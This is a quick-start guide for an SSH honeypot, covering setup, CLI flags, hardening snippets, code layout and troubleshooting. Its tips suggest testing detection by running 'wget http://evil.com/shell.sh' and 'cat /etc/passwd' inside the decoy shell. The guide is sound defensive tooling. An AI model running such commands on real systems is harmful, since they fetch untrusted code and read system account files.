# Quick Start Guide — SSH Honeypot

## TL;DR

```bash
pip install -r requirements.txt
python main.py --open --dashboard
# SSH:       ssh -p 2222 admin@localhost (any password)
# Dashboard: http://localhost:5000
```

---

## 5-Step Setup

```
Step 1: Install deps      →  pip install -r requirements.txt
Step 2: Run honeypot      →  python main.py --open --dashboard
Step 3: Connect SSH       →  ssh -p 2222 admin@localhost
Step 4: View dashboard    →  http://localhost:5000
Step 5: Check logs        →  tail -f logs/threats.log
```

---

## CLI Flags You Need to Know

| Flag | What it does | When to use |
|------|-------------|-------------|
| `--open` | Accept **all** credentials | Development, maximum data collection |
| `--dashboard` | Start web UI on port 5000 | Always — enables real-time monitoring |
| `--dashboard-port 8080` | Use port 8080 instead | Port 5000 in use |
| `--port 22` | Use port 22 (needs sudo) | Production (root required) |
| `--user X --pass Y` | Enforce specific creds | Selective capture mode |
| `--no-db` | Disable SQLite logging | Lightweight testing |
| `--wazuh-host 192.168.1.100` | Forward to Wazuh SIEM | Production SIEM integration |

---

## 8 Quick Wins (Implement First!)

### 1. ✅ Fix Already Applied — Requirements.txt (Critical)
Flask was replaced with FastAPI. You're good.

### 2. ✅ Fix Already Applied — Password Hashing
Passwords are now SHA-256 hashed before logging.

### 3. ✅ Fix Already Applied — Rate Limiting
IP-based rate limiting: max 10 attempts per 60s.

### 4. ✅ Fix Already Applied — Docker Dashboard Port
Port 5000 is now exposed in Dockerfile and docker-compose.yml.

### 5. Add Session Timeout (~30 min to implement)
```python
# In core/command_engine.py, add to shell loop:
SESSION_TIMEOUT = 3600
last_activity = time.time()
if time.time() - last_activity > SESSION_TIMEOUT:
    channel.send("\nbash: session timeout\n")
    break
```

### 6. Add Input Validation (~1 hour to implement)
```python
# In core/command_engine.py, after shlex.split():
if len(cmd) > 4096:
    channel.send("bash: command too long\n")
    continue
```

### 7. Add Output Truncation (~30 min to implement)
```python
# After any large output:
MAX_OUTPUT = 1_048_576  # 1 MB
if len(output) > MAX_OUTPUT:
    output = output[:MAX_OUTPUT] + "\n... (truncated)\n"
```

### 8. Make Commands Case-Insensitive (~15 min to implement)
```python
# In emulated_shell(), change:
if parts[0] == "ls":
# To:
cmd_name = parts[0].lower()
if cmd_name == "ls":
```

---

## Understanding the Code

### Where Commands Are Handled
- **File:** `core/command_engine.py` (1,600+ lines)
- **Function:** `emulated_shell(channel, client_ip, cmd_logger, db)`
- **Pattern:** `if parts[0] == "ls":` → add your command here
- **Static responses:** `STATIC_RESPONSES` dict at top of file

### Where Threats Are Detected
- **File:** `core/threat_engine.py`
- **Patterns:** `_RAW` list — add `(regex, category, score, mitre_id, description)`
- **Scoring:** 0-100 composite, score > 70 = high priority alert pushed to SSE

### Where Data is Stored
- **SQLite:** `honeypot.db` (5 tables)
- **Logs:** `logs/funnel.log`, `logs/threats.log`, `logs/cmd_audits.log`, `logs/system.log`

### How the Dashboard Gets Live Data
```
Threat engine → event_queue (Queue) → web/app.py SSE → browser
```
The `event_queue` in `threat_engine.py` is consumed by the `/sse` endpoint in `web/app.py`.

---

## Common Issues (1-line fixes)

| Issue | Fix |
|-------|-----|
| `No module named 'fastapi'` | `pip install -r requirements.txt` |
| Dashboard not loading | Start with `--dashboard` flag |
| Port 2222 in use | `python main.py --port 2223 --open` |
| No threats detected | Connect and run `cat /etc/passwd` |
| Docker dashboard not accessible | Already fixed — port 5000 now exposed |
| Logs empty | Run a command in SSH session first |

---

## Pro Tips

1. **Use `--open` mode for testing** — captures all credentials, max data
2. **Test threat detection:** SSH in and run `wget http://evil.com/shell.sh` — watch the threats.log
3. **Use sqlite3 for queries:** `sqlite3 honeypot.db "SELECT * FROM threats LIMIT 5;"`
4. **Live log monitoring:** `tail -f logs/threats.log | python3 -m json.tool`
5. **Simulate a real attack:** Try the commands in `examples/test-ssh-connection.sh`
6. **Reset data:** Delete `honeypot.db` and `logs/*.log`, then restart

---

## File You'll Edit Most

| Task | File |
|------|------|
| Add a new command | `core/command_engine.py` |
| Add a threat pattern | `core/threat_engine.py` → `_RAW` list |
| Change fake server identity | `config/settings.py` → `FAKE_*` vars |
| Add lure files | `core/virtual_fs.py` → `file_contents` dict |
| Add API endpoint | `web/app.py` |
| Change database schema | `database/db.py` |

---

## What to Implement Next

See `docs/analysis/2-3_DAYS_ACTION_PLAN.md` for the detailed plan. Priority order:

1. Session timeout (30 min)
2. Input validation (1 hour)
3. Output truncation (30 min)  
4. Case-insensitive commands (15 min)
5. Piping support `|` (8 hours — biggest feature)
6. Environment variable expansion (2 hours)
7. Glob patterns (2 hours)
